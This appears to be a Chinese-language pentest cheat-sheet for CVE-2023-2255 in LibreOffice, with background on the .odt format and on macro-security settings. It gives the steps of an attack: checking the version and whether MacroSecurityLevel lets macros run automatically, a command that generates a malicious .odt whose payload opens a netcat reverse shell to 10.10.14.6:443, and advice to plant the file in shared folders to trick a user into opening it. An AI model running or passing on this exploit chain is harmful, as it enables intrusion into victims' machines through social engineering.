# LibreOffice

CVE-2023-2255（7.4[7.4.7之前的版本]）（7.5[7.5.3之前的版本]）

## 介绍

由于LiberOffice文档基金会（The Document Foundation）编辑器组件中中访问控制不当，攻击者可以构造一个文档，该文档会在未经用户许可的情况下加载外部链接。在受影响的LiberOffice文档版本中，使用链接到外部文件的“浮动框架”的文档会在未提示用户授权的情况下加载这些框架内容。这与LiberOffice中对其他链接内容的处理方式不一致。

### 1）确认版本

version.ini

### 2）确认是否能够自动执行宏（不行也可以试试）

```
powershell: $env:appdata\LibreOffice\4\user\registrymodifications.xcu
cmd:%APPDATA%\LibreOffice\4\user\registrymodifications.xcu

如果registrymodifications.xcu里MacroSecurityLevel=0 就代表打开就默认执行宏不弹出确认按钮

<item oor:path="/org.openoffice.Office.Common/Security/Scripting"><prop oor:name="MacroSecurityLevel" oor:op="fuse"><value>0</value></prop></item>


MacroSecurityLevel=0 宏可以自动执行
MacroSecurityLevel=1 宏执行弹出提示
MacroSecurityLevel=2 宏完全不能执行
```

### 3）生成Payload

python /CVE-2023-2255.py --cmd 'cmd.exe /c C:\ProgramData\nc64.exe -e cmd.exe 10.10.14.6 443' --output exploit.odt

### 4）上传到一些共享目录或者特殊目录欺骗点击

上钩得到shell

## odt格式文件是什么？

### 介绍

.odt是LiberOffice/OpenOffice writer的文档格式，本质是一个ZIP压缩包+XML文件集合。

odt = OpenDocument Text

LibreOffice Writer/OpenOffice Writer的默认文档格式

对标：

​	（1）.docx（Word）

​	（2）.odt（OASIS）

### .odt的文件结构（zip解压后）

```
mimetype
content.xml        ← 文档正文（最重要）
styles.xml
meta.xml
settings.xml
META-INF/
Pictures/
```

| 文件                  | 作用                       |
| --------------------- | -------------------------- |
| content.xml           | 正文、对象、事件监听、外链 |
| styles.xml            | 样式                       |
| settings.xml          | 文档设置                   |
| META-INF/manifest.xml | 文件清单                   |

漏洞就是 <script:event-listener>就在content.xml里

## 宏执行的检查

（1）MacroSecurityLevel

（2）文档是否来自受信任来源

（3）是否被标记为来自互联网

（4）是否在信任位置

（5）是否签名宏

（6）是否被管理员覆盖策略
